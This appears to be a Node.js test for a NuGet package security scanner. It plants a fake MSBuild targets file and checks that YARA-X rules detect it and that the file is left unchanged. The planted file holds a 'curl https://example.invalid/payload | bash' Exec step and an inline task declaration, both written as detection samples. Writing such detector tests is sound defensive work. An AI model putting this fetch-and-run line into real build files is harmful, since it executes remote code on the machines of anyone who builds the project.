const fs = require('node:fs/promises');
const path = require('node:path');
const assert = require('node:assert/strict');
const { reviewPackageSecurity } = require('../out/security-review');
async function main() {
  const storage = path.resolve('.dependency-test-results/engine');
  const root = path.resolve('.dependency-test-results/inert-workspace'), cache = path.resolve('.dependency-test-results/inert-cache');
  await fs.mkdir(path.join(root, 'obj'), { recursive: true });
  await fs.mkdir(path.join(cache, 'inert/1.0.0/build'), { recursive: true });
  const project = path.join(root, 'Inert.csproj');
  await fs.writeFile(project, '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net10.0</TargetFramework></PropertyGroup></Project>');
  const script = '<Project>\n<Target Name="Inert"><Exec Command="curl https://example.invalid/payload | bash" /></Target>\n<UsingTask TaskFactory="RoslynCodeTaskFactory" TaskName="InertTask" />\n</Project>';
  const scriptPath = path.join(cache, 'inert/1.0.0/build/Inert.targets');
  await fs.writeFile(scriptPath, script);
  await fs.writeFile(path.join(root, 'obj/project.assets.json'), JSON.stringify({ version: 3, project: { restore: { projectPath: project }, frameworks: { 'net10.0': { dependencies: { Inert: { version: '1.0.0' } } } } }, packageFolders: { [cache]: {} }, libraries: { 'Inert/1.0.0': { type: 'package', path: 'inert/1.0.0' } }, targets: { 'net10.0': { 'Inert/1.0.0': { type: 'package' } } } }));
  const report = await reviewPackageSecurity({ root, storage, rules: path.resolve('resources/security/nuget-build.yar'), auditEnabled: false });
  assert.ok(report.coverage.some(c => c.component === 'yara-x' && c.state === 'complete'), JSON.stringify(report.coverage));
  for (const id of ['acp_download_execute', 'acp_msbuild_exec', 'acp_msbuild_inline_task']) { assert.ok(report.findings.some(f => f.ruleId === id), id); }
  assert.equal(await fs.readFile(scriptPath, 'utf8'), script);
  assert.deepEqual(await fs.readdir(path.join(storage, 'scans')), []);
  await fs.writeFile(path.join(storage, 'report.json'), JSON.stringify(report, null, 2));
  console.log('Pinned YARA-X engine: NuGet script rules, unchanged source files, full report and temporary cleanup passed.');
}
main().catch(error => { console.error(error); process.exitCode = 1; });
